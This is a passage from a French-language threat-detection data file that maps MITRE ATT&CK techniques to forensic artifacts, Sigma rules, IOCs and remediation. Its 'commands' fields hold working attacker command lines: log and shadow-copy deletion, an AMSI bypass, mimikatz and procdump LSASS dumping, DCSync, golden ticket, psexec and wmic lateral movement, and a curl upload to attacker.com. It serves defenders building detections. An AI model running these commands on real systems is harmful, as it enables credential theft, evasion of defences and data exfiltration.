    iocs: ['Sysmon Event 8 : source inhabituel vers explorer/svchost', 'Région RWX dans processus signé sans DLL backing', 'Thread sans module associé (start address en heap)', 'malfind flagge PE headers hors zones image légitimes'],
    remediation: ['EDR avec scanning mémoire comportemental', 'ACG (Arbitrary Code Guard) via ProcessMitigationPolicy', 'Sysmon EventID 8 avec filtre CreateRemoteThread ciblant processus sensibles'],
  },
  {
    id: 'log-clearing',
    tactic: 'Defense Evasion',
    title: 'Effacement des Journaux (Log Clearing)',
    icon: '🧹',
    severity: 'critical',
    ttps: ['T1070.001', 'T1070.002', 'T1562.002'],
    apt: ['APT28', 'APT38', 'Lazarus', 'Sandworm'],
    malware: ['NotPetya', 'BlackEnergy', 'WhisperGate'],
    summary: "Effacement des journaux Windows pour entraver l'investigation. L'effacement lui-même laisse une trace (EventID 1102/104) — si les logs sont centralisés.",
    artifacts: [
      { type: 'EVTX Security', items: ['1102 — Security log cleared (indique QUI a effacé)', '4719 — System audit policy changed'] },
      { type: 'EVTX System', items: ['104 — System log cleared', '7040 — Service EventLog modifié'] },
      { type: 'SIEM / Centralisé', items: ['Gap temporel dans les événements (dernier event avant effacement)', 'Absence EventID 4800 — activité nocturne sans traces'] },
      { type: 'VSS / Shadow Copy', items: ['vssadmin.exe delete shadows /all', 'wmic shadowcopy delete'] },
    ],
    commands: [
      'wevtutil cl Security',
      'wevtutil cl System',
      "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"",
      'vssadmin.exe delete shadows /all /quiet',
      'wbadmin delete catalog -quiet',
      'bcdedit.exe /set {default} recoveryenabled No',
    ],
    sigma: ['win_event_log_cleared', 'win_vssadmin_delete_shadows', 'win_bcdedit_recovery_disabled'],
    iocs: ['EventID 1102 dans Security log', 'EventID 104 dans System log', 'Gap dans la timeline des événements', 'vssadmin / wmic shadowcopy delete après compromission'],
    remediation: ['Centralisation des logs en temps réel (Splunk, Elastic SIEM)', 'Logs immuables (Syslog vers serveur dédié write-only)', 'Alerter sur EventID 1102 / 104 immédiatement'],
  },
  {
    id: 'timestomping',
    tactic: 'Defense Evasion',
    title: 'Timestomping — Modification des Timestamps',
    icon: '⏱️',
    severity: 'medium',
    ttps: ['T1070.006'],
    apt: ['APT28', 'APT29', 'Turla', 'MuddyWater'],
    malware: ['Meterpreter (timestomp)', 'Cobalt Strike'],
    summary: "Modification des horodatages $STANDARD_INFORMATION pour tromper l'analyste. Détectable car $FILE_NAME n'est pas modifié par les outils courants.",
    artifacts: [
      { type: 'MFT Analysis', items: ['$STANDARD_INFORMATION ≠ $FILE_NAME timestamps → timestomping quasi-certain', '$SI Modified avant Created (impossible en fonctionnement normal)', 'Timestamp à heure ronde (00:00:00.000) — artefact courant'] },
      { type: "Outils d'analyse", items: ['MFTECmd.exe -f $MFT --csv output\\ → comparer SI vs FN', 'Plaso / log2timeline reconstruit la timeline complète', 'icat + fls (Autopsy/TSK) pour extraire $MFT brut'] },
    ],
    commands: [
      '# Meterpreter',
      'meterpreter > timestomp C:\\evil.exe -z "01/01/2020 12:00:00"',
      '# PowerShell',
      '(Get-Item "evil.exe").LastWriteTime = "01/01/2020 12:00:00"',
      '(Get-Item "evil.exe").CreationTime = "01/01/2020 12:00:00"',
    ],
    sigma: [],
    iocs: ['$SI Modified < $SI Created', '$SI timestamps ≠ $FN timestamps', 'Timestamp identique à la seconde sur plusieurs fichiers', "Timestamp antérieur à la date d'installation OS"],
    remediation: ['Collecter $MFT complet lors de la réponse à incident', "Comparer $SI et $FN dans l'analyse forensique", 'Centraliser les hashes de fichiers critiques'],
  },
  {
    id: 'amsi-bypass',
    tactic: 'Defense Evasion',
    title: 'AMSI Bypass & Obfuscation PowerShell',
    icon: '🎭',
    severity: 'high',
    ttps: ['T1562.001', 'T1027.010'],
    apt: ['APT29', 'FIN7', 'TA505'],
    malware: ['PowerSploit', 'Empire', 'Cobalt Strike'],
    summary: "Contournement de l'Antimalware Scan Interface (AMSI) via patch mémoire ou obfuscation avancée pour échapper aux signatures AV/EDR lors de l'exécution PowerShell.",
    artifacts: [
      { type: 'EVTX PowerShell', items: ['4104 — ScriptBlock contenant amsiInitFailed, AmsiUtils, SetField', "Absence d'événements PS après un certain point (AMSI patché)"] },
      { type: 'ETW', items: ['Microsoft-Windows-AMSI/Operational : bypass tenté si ETW non patché'] },
      { type: 'Mémoire', items: ['amsi.dll avec bytes modifiés dans AmsiScanBuffer (patch à 0x80070057)', 'Strings obfusquées reconstruites en mémoire avant exécution'] },
    ],
    commands: [
      '# AMSI Patch via réflexion .NET',
      '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
      '# Obfuscation par concaténation',
      '$x = "Inv"+"oke-Mi"+"mikatz"',
      '# Obfuscation par encoding char',
      '$x = [char]73+[char]69+[char]88  # IEX',
    ],
    sigma: ['win_powershell_amsi_bypass', 'win_susp_powershell_obfuscation'],
    iocs: ['amsiInitFailed / AmsiUtils dans ScriptBlock (EventID 4104)', 'Nombreuses concaténations de chaînes dans script court', 'Utilisation intensive de [char], -join, -replace', 'Memory patch de amsi.dll détecté par EDR'],
    remediation: ['PowerShell v5+ obligatoire (meilleur AMSI logging)', 'ETW hardening (protection contre le patch ETW)', 'Alerter sur techniques AMSI bypass connues via Sigma'],
  },

  // ─── CREDENTIAL ACCESS ─────────────────────────────────────────────────────
  {
    id: 'credential-dump-lsass',
    tactic: 'Credential Access',
    title: 'LSASS Credential Dumping',
    icon: '🔑',
    severity: 'critical',
    ttps: ['T1003.001'],
    apt: ['APT28', 'APT29', 'Lazarus', 'Evil Corp'],
    malware: ['Mimikatz', 'Procdump', 'comsvcs.dll MiniDump', 'LaZagne'],
    summary: "Extraction des credentials (NTLM hashes, Kerberos tickets, WDigest) depuis la mémoire LSASS. Étape critique avant le mouvement latéral.",
    artifacts: [
      { type: 'EVTX Security', items: ['4688 — procdump.exe, mimikatz.exe, sqldumper.exe avec args lsass', '4656/4663 — accès handle LSASS'] },
      { type: 'Sysmon', items: ['10 — ProcessAccess LSASS avec GrantedAccess 0x1fffff ou 0x1010'] },
      { type: 'Prefetch', items: ['procdump.exe, procdump64.exe, mimikatz.exe, createdump.exe'] },
      { type: 'MFT', items: ['Fichier .dmp créé : lsass.dmp, debug.bin dans %TEMP%, C:\\Windows\\Temp'] },
      { type: 'Mémoire RAM', items: ['vol3 windows.cmdline — chercher args procdump / mimikatz', 'vol3 windows.handles — handle lsass.exe avec droits élevés'] },
    ],
    commands: [
      'procdump.exe -ma lsass.exe lsass.dmp',
      'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID_LSASS> C:\\temp\\lsass.dmp full',
      'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
    ],
    sigma: ['win_lsass_access_non_system_account', 'win_procdump_usage', 'win_mimikatz_detection'],
    iocs: ['Accès LSASS avec GrantedAccess 0x1fffff (full access)', 'Fichier .dmp créé dans répertoire non-système', 'comsvcs.dll invoqué via rundll32 avec MiniDump', 'procdump.exe dans prefetch'],
    remediation: ['Credential Guard (virtualisation-based isolation LSA)', 'Protected Process Light (PPL) pour lsass.exe', 'WDigest désactivé : HKLM\\System\\..\\LSA\\UseLogonCredential=0', 'Sysmon EventID 10 avec filtre GrantedAccess 0x1fffff'],
  },
  {
    id: 'dcsync',
    tactic: 'Credential Access',
    title: 'DCSync — Extraction AD via Réplication',
    icon: '🏛️',
    severity: 'critical',
    ttps: ['T1003.006'],
    apt: ['APT29', 'APT28', 'Evil Corp'],
    malware: ['Mimikatz lsadump::dcsync', 'Impacket secretsdump.py'],
    summary: "Simulation d'un Domain Controller pour demander la réplication des credentials AD via MS-DRSR. Permet d'extraire tous les hashes NTLM sans toucher lsass.exe.",
    artifacts: [
      { type: 'EVTX Security (DC)', items: ['4662 — accès objet Directory Service avec rights {1131f6aa...} (DS-Replication-Get-Changes)', '4742 / 4728 — ajout droits de réplication suspects'] },
      { type: 'Réseau', items: ['Flux MS-DRSR (DRSUAPI) depuis machine non-DC', 'Port 445 ou RPC vers DC depuis workstation'] },
    ],
    commands: [
      'mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"',
      'secretsdump.py corp.local/admin:pass@DC_IP -just-dc',
      'secretsdump.py corp.local/admin:pass@DC_IP -just-dc-ntlm',
    ],
    sigma: ['win_dcsync_attack', 'win_susp_ad_replication_right'],
    iocs: ['EventID 4662 avec GetChanges depuis non-DC', 'Flux DRSUAPI depuis workstation ou serveur non-DC', 'Compte avec droits DS-Replication-Get-Changes ajoutés hors proc standard'],
    remediation: ['Auditer les comptes avec droits de réplication AD', 'Alerter sur EventID 4662 avec source ≠ DC', 'Privileged Identity Management (PIM) pour comptes de réplication'],
  },
  {
    id: 'ntds-extraction',
    tactic: 'Credential Access',
    title: 'NTDS.dit Extraction (Base AD)',
    icon: '📂',
    severity: 'critical',
    ttps: ['T1003.003'],
    apt: ['APT28', 'APT41', 'Cl0p', 'LockBit operators'],
    malware: ['NTDSDumpEx', 'Impacket', 'CrackMapExec'],
    summary: "Extraction de la base de données Active Directory (NTDS.dit) via Volume Shadow Copy ou ntdsutil pour obtenir tous les hashes NTLM du domaine en mode offline.",
    artifacts: [
      { type: 'EVTX System', items: ['7036 — Volume Shadow Copy service started', '4688 — ntdsutil.exe, vssadmin.exe, diskshadow.exe'] },
      { type: 'Prefetch', items: ['ntdsutil.exe, vssadmin.exe, diskshadow.exe'] },
      { type: 'MFT', items: ['NTDS.dit copié vers chemin inhabituel (C:\\Temp\\ntds.dit)', 'SYSTEM hive copié pour déchiffrement des hashes'] },
    ],
    commands: [
      'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\dump" q q',
      'vssadmin create shadow /for=C:',
      'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\',
      '# Analyse offline',
      'secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL',
    ],
    sigma: ['win_ntdsutil_activity', 'win_susp_shadow_copy_creation', 'win_diskshadow_script'],
    iocs: ['ntdsutil.exe avec arg "ifm" ou "create full"', 'vssadmin.exe create shadow suivi de copie NTDS.dit', 'NTDS.dit dans répertoire non-system', 'SYSTEM hive copié avec ntds.dit'],
    remediation: ["Restreindre accès en lecture à C:\\Windows\\NTDS", 'Tiered Administration Model (DC tier séparé)', 'Alerter sur toute copie de NTDS.dit hors backup légitime'],
  },
  {
    id: 'pass-hash',
    tactic: 'Credential Access',
    title: 'Pass the Hash / Pass the Ticket / Golden Ticket',
    icon: '🎫',
    severity: 'critical',
    ttps: ['T1550.002', 'T1550.003', 'T1558'],
    apt: ['APT28', 'APT29', 'FIN7', 'Evil Corp'],
    malware: ['Mimikatz', 'Impacket', 'Rubeus', 'CrackMapExec'],
    summary: "PtH : authentification NTLM avec le hash sans mot de passe clair. PtT : réutilisation de ticket Kerberos. Golden Ticket : forge de TGT avec hash KRBTGT pour persistance totale.",
    artifacts: [
      { type: 'EVTX Security', items: ['4624 Type 3 — logon réseau NTLM depuis source inhabituelle', '4648 — logon avec credentials explicites (PtH)', '4769 / 4768 — TGS/TGT demandés (PtT, Golden Ticket)', '4776 — NTLM authentication sur DC'] },
      { type: 'Réseau', items: ['Authentifications NTLM en masse depuis même IP', 'TGT avec EncryptionType=0x17 (RC4) suspect pour Golden Ticket'] },
    ],
    commands: [
      'mimikatz.exe "sekurlsa::pth /user:admin /ntlm:<HASH> /domain:corp" "exit"',
      'impacket-psexec corp/admin@TARGET_IP -hashes :NTHASH',
      'Rubeus.exe ptt /ticket:<base64_ticket>',
      'mimikatz.exe "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH>" "exit"',
      'crackmapexec smb 192.168.1.0/24 -u admin -H <NTHASH> -x "whoami"',
    ],
    sigma: ['win_pass_the_hash_detection', 'win_golden_ticket_detection', 'win_pass_the_ticket'],
    iocs: ['Logon Type 3 depuis machine non habituelle pour cet utilisateur', 'Même hash NTLM sur plusieurs machines en quelques secondes', 'TGT avec durée de vie > 10h (Golden Ticket = 10 ans par défaut)', 'Ticket Kerberos RC4 pour compte configuré AES'],
    remediation: ['Credential Guard (empêche PtH en mémoire LSASS)', 'Protected Users Security Group (désactive NTLM, force Kerberos AES)', 'KRBTGT password rotation (dévalue les Golden Tickets)', 'Tier 0 : DC ne se connecte jamais aux workstations'],
  },
  {
    id: 'browser-credentials',
    tactic: 'Credential Access',
    title: 'Vol de Credentials Navigateur',
    icon: '🌐',
    severity: 'high',
    ttps: ['T1555.003', 'T1539'],
    apt: ['TA453', 'APT34', 'Gamaredon'],
    malware: ['RedLine Stealer', 'Raccoon Stealer', 'Vidar', 'Mars Stealer', 'LaZagne'],
    summary: "Extraction des mots de passe sauvegardés, cookies de session et données de formulaires depuis Chrome, Firefox, Edge via accès aux bases SQLite et Master Keys.",
    artifacts: [
      { type: 'Fichiers accédés', items: [
        'Chrome : %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data (SQLite)',
        'Chrome cookies : %LOCALAPPDATA%\\...\\Default\\Network\\Cookies',
        'Edge : %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data',
        'Firefox : %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json',
        'Master Key : %APPDATA%\\Microsoft\\Protect\\<SID>\\',
      ]},
      { type: 'Prefetch', items: ['LaZagne.exe, BrowserPasswordDecryptor', 'Stealer dropper accédant aux fichiers SQLite'] },
      { type: 'Sysmon', items: ['11 — FileCreate : copie de Login Data vers %TEMP%', '3 — NetworkConnect depuis stealer vers C2'] },
    ],
    sigma: ['win_lazagne_execution', 'win_browser_login_data_access'],
    iocs: ['Accès à Login Data depuis processus non-navigateur', 'Copie des fichiers SQLite vers %TEMP%', 'Connexion réseau depuis processus ayant lu Login Data'],
    remediation: ['Device Bound Credentials (DBSC) dans Chrome', 'Gestionnaire de mots de passe tiers (KeePass, Bitwarden)', 'EDR : alerter sur accès non-navigateur aux fichiers Login Data'],
  },

  // ─── DISCOVERY ─────────────────────────────────────────────────────────────
  {
    id: 'ad-enumeration',
    tactic: 'Discovery',
    title: 'Enumération Active Directory (BloodHound)',
    icon: '🐕',
    severity: 'high',
    ttps: ['T1087.002', 'T1069.002', 'T1482'],
    apt: ['APT29', 'FIN7', 'Evil Corp', 'BlackCat/ALPHV'],
    malware: ['SharpHound', 'PowerView', 'ADExplorer', 'ldapdomaindump'],
    summary: "Collecte exhaustive des relations AD (GPO, ACL, groupes, sessions) pour identifier les chemins d'escalade vers Domain Admin via BloodHound.",
    artifacts: [
      { type: 'EVTX Security (DC)', items: ['4662 — nombreux accès à des objets AD en peu de temps', '4624 Type 3 — logon réseau depuis machine attaquant vers DC'] },
      { type: 'Réseau', items: ['Volume élevé de requêtes LDAP depuis une seule machine', 'Requêtes LDAP/S avec filtres génériques ((objectClass=*), (objectCategory=computer))', 'Requêtes SMB vers SYSVOL et NETLOGON'] },
      { type: 'Prefetch', items: ['SharpHound.exe, bloodhound.exe'] },
    ],
    commands: [
      'SharpHound.exe -c All --zipfilename loot.zip',
      'Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip',
      'Get-DomainUser -Properties samaccountname,memberof,lastlogon',
      'Get-DomainComputer -Properties name,operatingsystem,dnshostname',
      'ldapdomaindump -u corp\\user -p pass dc_ip',
    ],
    sigma: ['win_bloodhound_sharphound_execution', 'win_susp_ldap_recon', 'win_powerview_usage'],
    iocs: ['SharpHound.exe dans prefetch', 'Volume élevé de requêtes LDAP en < 60 secondes', 'Fichiers JSON BloodHound dans %TEMP%', 'LDAP bind depuis workstation utilisateur standard'],
    remediation: ['LDAP Channel Binding + LDAP Signing obligatoires', 'Segmenter accès LDAP vers les DCs', 'Détecter patterns BloodHound : volume LDAP depuis workstations'],
  },
  {
    id: 'network-scan',
    tactic: 'Discovery',
    title: 'Reconnaissance Réseau Interne',
    icon: '🔭',
    severity: 'medium',
    ttps: ['T1046', 'T1135', 'T1016'],
    apt: ['APT41', 'FIN11', 'TA505'],
    malware: ['Nmap', 'Advanced IP Scanner', 'SoftPerfect Network Scanner'],
    summary: "Scan des ports et des partages réseau depuis la machine compromise pour cartographier l'environnement avant le mouvement latéral.",
    artifacts: [
      { type: 'Prefetch', items: ['nmap.exe, netscan.exe, portscan.exe, advanced_ip_scanner.exe'] },
      { type: 'EVTX Security', items: ['4688 — net.exe, net1.exe avec arguments view, use, share, sessions'] },
      { type: 'Réseau', items: ['Balayage TCP SYN vers multiples IPs depuis source unique', 'Accès SMB vers de nombreuses machines en peu de temps'] },
    ],
    commands: [
      'net view /domain',
      'net group "Domain Admins" /domain',
      'arp -a && ipconfig /all',
      'nmap -sn 192.168.1.0/24 -oN scan.txt',
      'for /L %i in (1,1,254) do @ping -n 1 -w 1 192.168.1.%i | findstr "TTL"',
    ],
    sigma: ['win_net_command_recon', 'win_susp_net_exec', 'net_scan_detection'],
    iocs: ['net.exe / net1.exe avec view, group, share en séquence', 'Nombreuses connexions TCP échouées vers IPs du sous-réseau', 'Outil de scan dans prefetch ou AmCache'],
    remediation: ['Segmentation réseau (VLAN, micro-segmentation)', 'IDS avec règles anti-scan (Snort/Suricata)', 'Bloquer les outils de scan tiers via AppLocker'],
  },

  // ─── LATERAL MOVEMENT ──────────────────────────────────────────────────────
  {
    id: 'lateral-rdp-smb',
    tactic: 'Lateral Movement',
    title: 'Mouvement Latéral — RDP / SMB / PsExec',
    icon: '↔️',
    severity: 'high',
    ttps: ['T1021.001', 'T1021.002', 'T1570'],
    apt: ['APT28', 'APT29', 'FIN7', 'LockBit operators'],
    malware: ['PsExec', 'Impacket smbexec', 'CrackMapExec'],
    summary: "Utilisation de comptes valides pour se déplacer via RDP, SMB (partage ADMIN$, IPC$) ou PsExec. Souvent combiné à PtH pour éviter les mots de passe en clair.",
    artifacts: [
      { type: 'EVTX Security (destination)', items: ['4624 Type 10 — RemoteInteractive (RDP)', '4624 Type 3 — Network (SMB, PsExec)', '4648 — credentials explicites', '4672 — privilèges sensibles'] },
      { type: 'EVTX RDP', items: ['1149 — authentication successful', '21 — session ouverte', '24 — session déconnectée'] },
      { type: 'EVTX System (destination)', items: ['7045 — service PSEXESVC installé (PsExec classique)'] },
      { type: 'Prefetch (source)', items: ['mstsc.exe, psexec.exe, psexec64.exe'] },
      { type: 'ShellBags / LNK', items: ['Accès \\\\machine\\partage dans ShellBags', 'Fichiers LNK vers partages réseau'] },
    ],
    commands: [
      'psexec.exe \\\\TARGET -u DOMAIN\\Admin -p P@ss cmd.exe',
      'impacket-smbexec DOMAIN/Admin:pass@TARGET',
      'impacket-wmiexec DOMAIN/Admin:pass@TARGET',
      'crackmapexec smb 192.168.1.0/24 -u admin -H <NTHASH> -x "whoami"',
    ],
    sigma: ['win_psexec_remote_execution', 'win_lateral_movement_rdp', 'win_multiple_admin_logons'],
    iocs: ['PSEXESVC service installé sur cible', 'Logon Type 3 suivi immédiatement de Type 10', 'mstsc.exe avec arguments de connexion automatique', 'CrackMapExec : accès rapide à nombreuses machines'],
    remediation: ['Désactiver RDP sur les machines non-serveurs', 'Network Level Authentication (NLA) pour RDP', 'Segmenter les VLANs admin', 'PAM / Jump server pour accès administrateur'],
  },
  {
    id: 'lateral-wmi-dcom',
    tactic: 'Lateral Movement',
    title: 'Mouvement Latéral via WMI / DCOM',
    icon: '🔌',
    severity: 'high',
    ttps: ['T1021.003', 'T1021.006'],
    apt: ['APT29', 'APT32', 'Lazarus'],
    malware: ['ShimRat', 'Cobalt Strike wmiexec', 'Impacket dcomexec'],
    summary: "Exécution de code à distance via WMI (Win32_Process.Create) ou DCOM (MMC20.Application, ShellBrowserWindow). Plus discret que PsExec — aucun service installé.",
    artifacts: [
      { type: 'EVTX Security (destination)', items: ['4624 Type 3 — Network logon', '4688 — wmiprvse.exe spawne cmd.exe / powershell.exe'] },
      { type: 'EVTX DistributedCOM', items: ['10021 / 10028 — DCOM connexion distante'] },
      { type: 'Réseau', items: ['Ports 135 (DCOM endpoint mapper) + ports dynamiques TCP', 'Traffic WMI/DCOM depuis workstation vers serveur'] },
    ],
    commands: [
      'wmic /node:TARGET /user:DOMAIN\\admin /password:P@ss process call create "cmd /c ..."',
      '# DCOM MMC20.Application via PowerShell',
      '$c = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","TARGET"))',
      '# Invoke ExecuteShellCommand method with cmd.exe and payload args',
      'impacket-dcomexec DOMAIN/Admin:pass@TARGET',
    ],
    sigma: ['win_wmi_lateral_movement', 'win_dcom_lateral_movement_mmc'],
    iocs: ['wmiprvse.exe spawne shells sur machine cible', 'Connexion DCOM depuis machine non-admin', 'WMI query distante Win32_Process.Create'],
    remediation: ['Restreindre DCOM par GPO (DCOM Machine Access Restrictions)', 'Firewall Windows : bloquer port 135 entre workstations', 'Sysmon EventID 1 avec parent wmiprvse.exe'],
  },

  // ─── COLLECTION ─────────────────────────────────────────────────────────────
  {
    id: 'data-staging',
    tactic: 'Collection',
    title: 'Staging & Archivage de Données',
    icon: '📦',
    severity: 'high',
    ttps: ['T1560.001', 'T1005', 'T1039'],
    apt: ['APT41', 'APT10', 'Cl0p', 'LockBit'],
    malware: ['7-Zip', 'WinRAR', 'robocopy', 'xcopy'],
    summary: "Collecte et archivage des données ciblées avant exfiltration. L'attaquant archive avec mot de passe pour contourner DLP et inspections réseau.",
    artifacts: [
      { type: 'MFT / $USNJrnl', items: ['Création massive de .zip, .7z, .rar dans %TEMP% ou C:\\Users\\Public', 'Accès en lecture sur partages réseau ou dossiers sensibles'] },
      { type: 'Prefetch', items: ["7z.exe, WinRAR.exe, robocopy.exe, xcopy.exe — date de l'archivage"] },
      { type: 'EVTX Security', items: ['5145 — accès à un partage réseau', '4663 — accès à un objet fichier (si audit activé)'] },
    ],
    commands: [
      '7z.exe a -p"<password>" -mhe C:\\Temp\\archive.7z C:\\Users\\ -r',
      'robocopy \\\\SRV\\Finance C:\\Temp\\Finance /S /COPY:DAT',
      'xcopy C:\\Users\\*\\Documents C:\\Temp\\docs /S /E /H /Y',
    ],
    sigma: ['win_7zip_password_archive', 'win_susp_robocopy', 'win_mass_file_collection'],
    iocs: ['7z.exe / WinRAR.exe avec paramètre -p (mot de passe)', 'robocopy vers répertoire temporaire inhabituel', 'Volume élevé accès fichiers sur partages RH/Finance/IT', 'Archives > 100 MB dans %TEMP%'],
    remediation: ['DLP endpoints (Microsoft Purview, Symantec DLP)', 'Alerter sur archivage avec mot de passe depuis processus non-admin', 'Surveiller volume I/O exceptionnel sur serveurs de fichiers'],
  },
  {
    id: 'keylogging',
    tactic: 'Collection',
    title: 'Keylogging & Screen Capture',
    icon: '⌨️',
    severity: 'high',
    ttps: ['T1056.001', 'T1113'],
    apt: ['APT34', 'Gamaredon', 'APT3'],
    malware: ['Agent Tesla', 'FormBook', 'NanoCore', 'AsyncRAT'],
    summary: "Enregistrement des frappes clavier et captures d'écran périodiques pour collecter mots de passe, informations de formulaires, et activité utilisateur.",
    artifacts: [
      { type: 'Fichiers', items: ['Logs keylogger dans %APPDATA% (.log, .dat avec noms aléatoires)', 'Screenshots dans %TEMP% ou %APPDATA% (.jpg, .bmp avec timestamp)'] },
      { type: 'Réseau', items: ['Exfiltration périodique via SMTP (587/465), HTTP POST, FTP', 'Intervalles réguliers de transfert (toutes les 5-10 min)'] },
      { type: 'Sysmon', items: ['3 — NetworkConnect depuis RAT vers C2', '11 — FileCreate dans %APPDATA% de fichiers .log/.dat'] },
    ],
    sigma: ['win_keyboard_hook_installation', 'win_susp_mail_exfil'],
    iocs: ['SetWindowsHookEx avec WH_KEYBOARD_LL ou WH_MOUSE_LL', 'Fichiers .log croissant régulièrement dans %APPDATA%', 'Connexions SMTP sortantes depuis application non-messagerie', 'Screenshots à intervalles fixes'],
    remediation: ['EDR comportemental : détection SetWindowsHookEx anormal', 'Filtrage SMTP sortant (bloquer port 25/587 vers Internet)', 'Endpoint DLP'],
  },

  // ─── COMMAND & CONTROL ─────────────────────────────────────────────────────
  {
    id: 'cobalt-strike-beacon',
    tactic: 'Command & Control',
    title: 'Cobalt Strike Beacon — Implant C2',
    icon: '📡',
    severity: 'critical',
    ttps: ['T1573.002', 'T1095', 'T1071.001', 'T1090'],
    apt: ['APT29', 'APT41', 'FIN7', 'Conti', 'LockBit'],
    malware: ['Cobalt Strike Beacon', 'Brute Ratel C4', 'Silver C2'],
    summary: "Cobalt Strike est le framework C2 le plus utilisé en compromission avancée. Le Beacon communique via HTTP/S, DNS ou SMB named pipes, avec jitter pour imiter du trafic légitime.",
    artifacts: [
      { type: 'Réseau', items: ['HTTP GET avec User-Agent Mozilla/5.0 statique et invariant', 'Balises HTTP à intervalles réguliers (sleep + jitter)', 'URI aléatoire imitant ressources légitimes (/jquery.min.js, /updates)', 'Certificat SSL avec attributs par défaut Cobalt Strike'] },
      { type: 'Mémoire', items: ['Région RWX dans processus injecté (rundll32, svchost)', 'PE Header du beacon in-memory avec MZ magic', 'Strings : beacon, watermark Cobalt Strike (TeamID)', 'vol3 windows.malfind — détecte régions suspectes'] },
      { type: 'Sysmon', items: ['3 — NetworkConnect depuis svchost / rundll32 vers IP externe', '8 — CreateRemoteThread (injection du beacon)', '22 — DNS query depuis processus injecté'] },
    ],
    sigma: ['win_cobaltstrike_beacon_indicators', 'win_susp_http_user_agent', 'win_cobaltstrike_process_injection'],
    iocs: ['User-Agent statique sur GET réguliers (même build)', 'Checksum 0x92EC en-tête Cobalt Strike (YARA)', 'Certificat SSL Cobalt Strike default (Issuer: Major Cobalt Strike)', 'Sleep régulier + burst activité réseau'],
    remediation: ['YARA scanning mémoire (CobaltStrikeParser)', 'JA3/JA3S TLS fingerprinting pour détecter Cobalt Strike', 'DNS RPZ pour bloquer domaines C2 connus', 'Proxy avec TLS inspection + User-Agent whitelist'],
  },
  {
    id: 'dns-tunneling',
    tactic: 'Command & Control',
    title: 'DNS Tunneling — C2 & Exfiltration',
    icon: '🕳️',
    severity: 'high',
    ttps: ['T1071.004', 'T1048.003'],
    apt: ['APT29', 'APT34 (OilRig)', 'Lazarus'],
    malware: ['Iodine', 'dnscat2', 'DNSExfiltrator', 'OilRig DNS tunneler'],
    summary: "Encapsulation de données dans les requêtes/réponses DNS (TXT, A, CNAME) pour établir un canal C2 ou exfiltrer des données en contournant les proxies et firewalls.",
    artifacts: [
      { type: 'DNS Logs', items: ['Volume élevé de requêtes pour même domaine racine', 'Sous-domaines très longs (> 50 chars) avec données encodées Base64', 'Requêtes TXT ou NULL record types inhabituels'] },
      { type: 'Réseau', items: ['DNS queries directes vers IP externe (bypass DNS interne)', 'Fréquence élevée de requêtes DNS depuis un seul processus'] },
      { type: 'Prefetch', items: ['iodine.exe, dnscat2.exe, dnstunnel.exe'] },
    ],
    sigma: ['dns_tunneling_entropy', 'dns_long_subdomain', 'dns_high_query_rate'],
    iocs: ['Sous-domaines > 50 caractères', 'Entropie élevée dans les labels DNS (Base64, hex)', 'Même FQDN avec centaines de sous-domaines uniques', 'Requêtes TXT vers domaines inconnus'],
    remediation: ['DNS Sinkhole (Palo Alto DNS Security, Cisco Umbrella)', 'Analyser entropie DNS avec DGA detection (Zeek)', 'Forcer tout trafic DNS via resolver interne', 'Bloquer requêtes DNS vers IPs externes directement'],
  },

  // ─── EXFILTRATION ──────────────────────────────────────────────────────────
  {
    id: 'exfil-cloud',
    tactic: 'Exfiltration',
    title: 'Exfiltration via Cloud / Rclone',
    icon: '📤',
    severity: 'critical',
    ttps: ['T1041', 'T1567.002', 'T1537'],
    apt: ['APT41', 'APT10', 'Cl0p', 'LockBit', 'BlackCat/ALPHV'],
    malware: ['Rclone', 'MEGAsync', 'WinSCP', 'FileZilla'],
    summary: "Upload vers services cloud légitimes (MEGA, Dropbox, S3) ou serveurs attaquant via HTTP/S. Rclone est quasi-systématiquement utilisé par les groupes ransomware pour la double extorsion.",
    artifacts: [
      { type: 'Prefetch', items: ['rclone.exe, MEGAcmd.exe, winscp.exe, FileZilla.exe'] },
      { type: 'Réseau', items: ['Upload massif vers mega.nz, dropbox.com, api.dropboxapi.com', 'Bande passante montante élevée vers un seul domaine', 'Connexion SFTP/FTP vers IP externe'] },
      { type: 'Fichiers config', items: ['rclone.conf dans %APPDATA%\\Rclone\\ (contient credentials cloud)', 'Logs de transfert WinSCP : %APPDATA%\\WinSCP\\'] },
    ],
    commands: [
      'rclone.exe copy C:\\Temp\\data mega:/exfil --no-check-dest',
      'rclone.exe copy C:\\Temp\\data s3:bucket/exfil --s3-access-key-id AK...',
      'curl -F "file=@C:\\Temp\\data.7z" http://attacker.com/upload',
    ],
    sigma: ['win_rclone_usage', 'win_susp_cloud_upload', 'net_mega_upload'],
    iocs: ['rclone.exe dans prefetch — TRÈS SPÉCIFIQUE aux ransomwares', 'rclone.conf avec credentials cloud', 'Upload > 1 GB vers mega.nz', 'MEGAsync ou MEGAcmd installé sur serveur'],
    remediation: ['Bloquer mega.nz, transfer.sh, gofile.io au proxy', 'DLP : fichiers > 10 MB vers cloud non-autorisé', 'Alerter sur rclone.exe immédiatement (jamais légitime en entreprise)'],
  },
  {
    id: 'exfil-dns',
    tactic: 'Exfiltration',
    title: 'Exfiltration via DNS / ICMP Covert Channel',
    icon: '📨',
    severity: 'high',
    ttps: ['T1048.003', 'T1048.002'],
    apt: ['APT34', 'APT32', 'Turla'],
    malware: ['OilRig DNSExfiltrator', 'Turla Carbon', 'dnscat2'],
    summary: "Exfiltration de données encodées dans des requêtes DNS (sous-domaines) ou ICMP. Contourne les firewalls autorisant DNS/ICMP mais bloquant HTTP sortant.",
    artifacts: [
